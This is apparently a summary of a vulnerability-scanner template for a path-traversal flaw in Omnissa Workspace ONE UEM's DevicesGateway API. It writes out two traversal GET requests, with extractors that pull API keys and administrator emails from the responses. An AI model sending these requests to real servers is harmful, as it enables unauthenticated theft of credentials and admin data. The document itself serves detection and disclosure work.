## Vulnerability
Omnissa Workspace ONE UEM (formerly VMware AirWatch) contains a path-traversal vulnerability in the DevicesGateway API. Crafted GET requests to `/DevicesGateway/apps/system-app-metadata/1` with `packageId=../../../../API/...` bypass access controls on restricted endpoints, allowing unauthenticated retrieval of sensitive data including API keys and active administrator records.

## PoC / Detection
Classification: info-leak

The template issues two raw GET probes (OR logic) that attempt the exact traversal path used in the exploit:
- First request: `GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/groups/apikeys?...`  
  Matcher: JSON body contains `"service_name"` + `"api_key"` + `Content-Type: application/json` + 200.  
  Extractor: `$.api_keys[].api_key` (JSON).
- Second request: `GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/admins/search?...`  
  Matcher: XML body contains `"AdminUser"` + `"Uuid"` + `Content-Type: application/xml` + 200.  
  Extractor: regex `<Email>([^<]+)</Email>`.

Success of either request confirms the path-traversal and leaks the targeted sensitive information.
